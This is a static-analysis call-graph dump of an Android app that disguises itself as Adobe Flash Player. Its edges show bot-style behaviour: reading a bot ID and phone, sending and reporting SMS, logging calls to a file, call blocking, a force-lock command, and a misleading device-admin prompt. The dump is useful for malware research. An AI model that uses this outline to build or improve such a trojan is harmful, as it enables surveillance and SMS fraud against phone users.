VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <android.app.Service: void onCreate()>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>($r20, $r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r5, $r17, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r24 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Calendar: java.util.Calendar getInstance()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)> ==> <java.util.Calendar: java.util.Calendar getInstance()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void exit(int)>(0) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.System: void exit(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: void onDestroy()>
VIRTUAL edge: $r24 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("http://", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\rTalkTime: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.SystemSWF: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("execMod") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Ha-ha!") in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.AdobeZCore$1: void <init>(com.adobe.flashplayer_.AdobeZCore,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
SPECIAL edge: specialinvoke $r7.<com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>(r0) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("forceLock[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "NOFILTER", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z1 = virtualinvoke $r21.<java.lang.String: boolean equals(java.lang.Object)>("On") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("us") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r13) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: r30 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("spam_data", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getCalls:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: $r18 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Package: ") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r6 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean contains(java.lang.CharSequence)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("callBlock") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>("a=2&b=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.app.Service: void onCreate()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<android.content.Intent: java.lang.String getAction()>() in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: java.lang.String getAction()>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("#", "W") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.packages.BK: void setContentView(int)>(2130903044) in <com.adobe.packages.BK: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(" ", "_") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent addFlags(int)>(67108864) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: android.content.Intent addFlags(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r6 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("#", "W") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Throwable: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setAction(java.lang.String)>("android.intent.action.VIEW") in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setAction(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.MacrosStat: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: void onCreate()>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.SystemSWF: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)> ==> <com.adobe.flashplayer_.SystemSWF: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r55.<java.lang.StringBuffer: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: void <init>()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=out_sms&i=sms") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.Integer valueOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "calls.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r12 = virtualinvoke $r12.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.MacrosStat: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("android.app.extra.ADD_EXPLANATION", "FLASH_PLUGIN_INSTALLATION\n\n\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0438 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u043e\u0432 com.adobe.flashplayer.\n\n\u041c\u043e\u0434\u0443\u043b\u044c \u0431\u0443\u0434\u0435\u0442 \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043d \u043a\u0430\u043a Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com.") in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.io.FileOutputStream openFileOutput(java.lang.String,int)>($r1, 0) in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <android.content.ContextWrapper: java.io.FileOutputStream openFileOutput(java.lang.String,int)>
